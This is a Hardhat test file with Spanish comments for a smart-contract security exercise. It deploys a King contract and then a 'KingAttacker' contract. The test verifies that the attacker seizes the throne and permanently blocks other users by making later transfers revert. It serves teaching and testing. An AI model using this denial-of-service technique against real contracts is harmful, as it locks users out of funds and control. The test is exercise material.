const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('Ejercicio 4', function () {
    let deployer, usuario, atacante;

    beforeEach(async function () {
        [deployer, atacante, usuario] = await ethers.getSigners();

        // Deployamos el contrato King con la cuenta "deployer"
        const King = await ethers.getContractFactory('King', deployer);
        this.contratoKing = await King.deploy({
            value: ethers.utils.parseEther('1'),
        });

        // El rey ahora es el deployer
        expect(await this.contratoKing.king()).to.eq(deployer.address);

        // Un usuario envía ETH al contrato para convertirse en el nuevo rey
        await usuario.sendTransaction({
            to: this.contratoKing.address,
            value: ethers.utils.parseEther('1.5'),
        });
        expect(await this.contratoKing.king()).to.eq(usuario.address);
    });

    it('Ataque', async function () {
        // ¿Atacar desde EOA o contrato? ¿Por qué?
        // desde un contrato para poder ejecutar un ataque DoS
        // Si es contrato, ¿cómo deployamos ese contrato? ¿Qué hay que enviar al contrato?
        // ¿Cómo podemos verificar que efectivamente el ataque tuvo éxito?
        // ¿Dónde conviene incluir esas verificaciones?
        const KingAttacker = await ethers.getContractFactory(
            'KingAttacker',
            atacante
        );
        this.contratoAtacante = await KingAttacker.deploy();
        await this.contratoAtacante.attack(this.contratoKing.address, {
            value: ethers.utils.parseEther('1.6'),
        });
        expect(await this.contratoKing.king()).to.eq(
            this.contratoAtacante.address
        );
    });

    afterEach(async function () {
        await expect(
            usuario.sendTransaction({
                to: this.contratoKing.address,
                value: ethers.utils.parseEther('10'),
            })
        ).to.be.revertedWith(
            "Transaction reverted: function selector was not recognized and there's no fallback nor receive function"
        );

        expect(await this.contratoKing.king()).to.not.eq(usuario.address);
    });
});
